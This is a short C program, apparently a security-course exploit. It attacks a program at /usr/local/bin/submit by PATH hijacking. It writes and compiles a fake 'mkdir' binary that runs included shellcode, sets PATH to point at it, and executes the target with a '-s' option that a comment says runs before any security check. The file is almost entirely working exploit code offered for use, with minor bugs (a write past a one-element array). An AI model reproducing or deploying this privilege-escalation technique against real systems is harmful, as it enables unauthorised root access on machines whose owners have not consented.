
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "shellcode.h"
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/submit"


int main(int argc, char *argv[]) {

  char *env[1];
  FILE* f;
  char *text1;
  char *text2;
  char *text3;

  mkdir("./bin/", 0700);
  f = fopen("./bin/ls.c", "w+");
  if (f == NULL) {
    printf("Error creating /bin/ls.c\n");
    return 0;
  }
  text1 = "#include <stdio.h>";
  text2 = "#include \"/share/shellcode.h\"";
  text3 = "int main(void){(*(void(*)()) shellcode)();return 0;}";

  fprintf(f, "%s\n", text1);
  fprintf(f, "%s\n", text2);
  fprintf(f, "%s\n", text3);
  fclose(f);
  system("gcc ./bin/ls.c -o ./bin/mkdir");
  // code calling submit
  argv[0] = "hello world"; argv[1] = "-s"; // "-s" will call show_confirmation function before any security check 
  argv[2] = NULL; argv[3] = NULL;

  env[0] = "PATH=/share/bin/"; env[1] = NULL;
  if (execve(TARGET, argv, env) < 0)
    fprintf(stderr, "execve failed.\n");
  return 0;
}
